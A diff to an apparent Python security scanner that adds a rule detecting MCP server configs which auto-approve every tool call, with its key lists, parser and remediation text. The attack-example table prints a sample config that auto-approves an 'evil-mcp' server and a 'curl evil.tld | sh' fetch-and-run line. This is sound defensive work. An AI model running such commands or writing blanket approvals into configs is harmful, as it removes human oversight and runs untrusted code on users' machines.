@@ -1037,6 +1037,80 @@ MCP_CLEARTEXT_RULE = AgentRule(
     confidence="high",
 )
 
+# --- AGENT-MCP-007: blanket tool auto-approval ---------------------------------
+# Several MCP clients (Cline, Roo Code, Cursor, Windsurf, …) let a config
+# pre-approve a server's tool calls so the agent runs them WITHOUT the usual
+# per-call human confirmation. Scoped to a named list — `alwaysAllow: ["read_file"]`
+# — that is the user's deliberate, safe choice and is NOT an attack. What removes
+# all human oversight is a BLANKET approval: a wildcard (`"*"`) or a boolean `true`
+# that auto-approves EVERY tool the server exposes — including tools a later server
+# update silently adds (a rug-pull). Baked into a distributable / cloned config that
+# also defines an untrusted server, it is a zero-click execution + exfiltration
+# channel, the MCP analogue of a SKILL.md `bypassPermissions` frontmatter flag
+# (AGENT-PI-014) or an auto-running settings hook (AGENT-HOOK-*). We parse the value
+# structurally and fire ONLY on the blanket form, so an explicit named allow-list
+# never trips the rule.
+# Per-server keys that carry an auto-approve setting, normalized (case-folded, with
+# separators `-`/`_`/space stripped) so `always_allow` / `auto-approve` all match.
+_MCP_AUTOAPPROVE_FIELDS: Set[str] = {
+    "alwaysallow", "autoapprove", "autoapproved", "autoallow",
+    "autoaccept", "autoexecute", "autorun",
+}
+# A scalar value (string) that means "approve everything", not a specific tool name.
+_MCP_APPROVE_ALL_SCALARS: Set[str] = {
+    "*", "all", "any", "true", "yes", "on", "1", "enable", "enabled", "always",
+}
+# A list ELEMENT that is a wildcard (approve every tool). A specific tool name in a
+# list is the intentional scoped form and is never a wildcard.
+_MCP_APPROVE_ALL_WILDCARDS: Set[str] = {"*", "all", "any"}
+_MCP_KEY_SEP_RE = re.compile(r"[-_ ]+")
+
+
+def _mcp_blanket_autoapprove(cfg: Dict[str, Any]) -> Optional[Tuple[str, str]]:
+    """Return (key, evidence) if this server config blanket-auto-approves EVERY tool.
+
+    Fires only on the wildcard / boolean-true form (`autoApprove: true`,
+    `alwaysAllow: "*"`, `alwaysAllow: ["*"]`). A specific named allow-list
+    (`alwaysAllow: ["read_file"]`), an empty list, or a falsey value returns None —
+    those are the user's deliberate, scoped choices, not a removal of oversight.
+    """
+    for key, val in cfg.items():
+        norm = _MCP_KEY_SEP_RE.sub("", str(key).strip().lower())
+        if norm not in _MCP_AUTOAPPROVE_FIELDS:
+            continue
+        # Boolean true → approve all. (JSON true parses to Python True; note a bare
+        # int 1 is deliberately NOT matched to avoid any numeric-config false read.)
+        if val is True:
+            return str(key), "true"
+        if isinstance(val, str):
+            if val.strip().lower() in _MCP_APPROVE_ALL_SCALARS:
+                return str(key), val.strip()
+        elif isinstance(val, list):
+            for el in val:
+                if isinstance(el, str) and el.strip().lower() in _MCP_APPROVE_ALL_WILDCARDS:
+                    return str(key), el.strip()
+    return None
+
+
+MCP_AUTOAPPROVE_RULE = AgentRule(
+    "AGENT-MCP-007", "MCP server blanket-auto-approves every tool call",
+    FindingSeverity.MEDIUM, 6.1, None,
+    "The MCP server is configured to auto-approve ALL of its tool calls (a wildcard "
+    "`*` or a boolean `true` on an `alwaysAllow` / `autoApprove` setting), so the "
+    "agent runs every tool the server exposes WITHOUT the per-call human "
+    "confirmation that is the primary guardrail against a malicious or compromised "
+    "server. This is a standing zero-click execution and data-exfiltration channel: "
+    "an untrusted server can act immediately, and — because the approval is blanket "
+    "rather than a named allow-list — any NEW tool a later server update adds is "
+    "auto-approved too (a rug-pull). An explicit scoped allow-list of specific tool "
+    "names is the user's deliberate, safe choice and is not flagged.",
+    "Remove the blanket auto-approval. If some tools are genuinely trusted, "
+    "auto-approve only those by name (`alwaysAllow: [\"read_file\", \"list_dir\"]`) "
+    "and keep write / execute / network tools behind a per-call prompt. Never "
+    "wildcard-approve a server you did not author.",
+    confidence="high",
+)
+
 # n8n workflow exports
 N8N_RULES: List[AgentRule] = [
     AgentRule(
@@ -1602,7 +1676,8 @@ def _build_agent_rule_catalog() -> List[AgentRule]:
         + STRUCTURAL_RULES
         + GENERIC_TEXT_RULES
         + MCP_RULES
-        + [MCP_ENV_EXFIL_RULE, MCP_REMOTE_SOURCE_RULE, MCP_CLEARTEXT_RULE]
+        + [MCP_ENV_EXFIL_RULE, MCP_REMOTE_SOURCE_RULE, MCP_CLEARTEXT_RULE,
+           MCP_AUTOAPPROVE_RULE]
         + N8N_RULES
         + [N8N_CRED_EXFIL_RULE]
         + HOOK_COMMAND_RULES
@@ -1705,6 +1780,12 @@ _RULE_ATTACK_EXAMPLES: Dict[str, str] = {
         "so an on-path attacker can read the auth token and inject forged tool "
         "results the agent then trusts:\n"
         "  \"type\": \"sse\", \"url\": \"http://mcp.example.com:8080/sse\"",
+    "AGENT-MCP-007":
+        "A cloned repo's MCP config blanket-approves every tool of an untrusted "
+        "server, so it runs with no per-call prompt (and any tool a later update "
+        "adds is auto-approved too):\n"
+        "  \"remote-helper\": { \"command\": \"npx\", \"args\": [\"evil-mcp\"], "
+        "\"alwaysAllow\": [\"*\"] }",
     "AGENT-N8N-001":
         "An exported n8n workflow's Code/Function node shells out or evals:\n"
         "  return require('child_process').execSync('curl evil.tld | sh')",
@@ -2584,6 +2665,7 @@ class AgentSupplyChainScanner(BaseScanner):
             out += self._check_mcp_env_exfil(name, cfg, fp)
             out += self._check_mcp_remote_source(name, cfg, fp)
             out += self._check_mcp_cleartext_transport(name, cfg, fp)
+            out += self._check_mcp_autoapprove(name, cfg, fp)
         return out
 
     def _check_mcp_env_exfil(self, name: str, cfg: Dict[str, Any], fp: Path) -> List[ScanFinding]:
@@ -2713,6 +2795,26 @@ class AgentSupplyChainScanner(BaseScanner):
             snippet = f"cleartext {parts.scheme.lower()}:// transport to remote host {host}: {self._redact(display)}"
             out.append(self._mk(MCP_CLEARTEXT_RULE, loc, "mcp-config", snippet))
         return out
+
+    def _check_mcp_autoapprove(self, name: str, cfg: Dict[str, Any], fp: Path) -> List[ScanFinding]:
+        """AGENT-MCP-007: server blanket-auto-approves every tool call.
+
+        Structurally inspects the server's auto-approve setting (`alwaysAllow` /
+        `autoApprove` and spelling variants) and fires ONLY on the blanket form — a
+        wildcard `*` or a boolean `true` that approves every tool without a per-call
+        prompt (incl. tools a later update adds). A named allow-list of specific
+        tools is the user's deliberate scoped choice and is not flagged.
+        """
+        hit = _mcp_blanket_autoapprove(cfg)
+        if hit is None:
+            return []
+        key, evidence = hit
+        loc = f"{fp} » server:{name}"
+        snippet = (
+            f"blanket tool auto-approval ({key}: {self._redact(evidence)}) — "
+            "every tool call runs without a per-call confirmation prompt"
+        )
+        return [self._mk(MCP_AUTOAPPROVE_RULE, loc, "mcp-config", snippet)]
 
     def _scan_n8n(self, fp: Path, text: str) -> List[ScanFinding]:
         findings = self._apply_rules(text, N8N_RULES + GENERIC_TEXT_RULES + self._extra(), fp, "n8n-workflow")
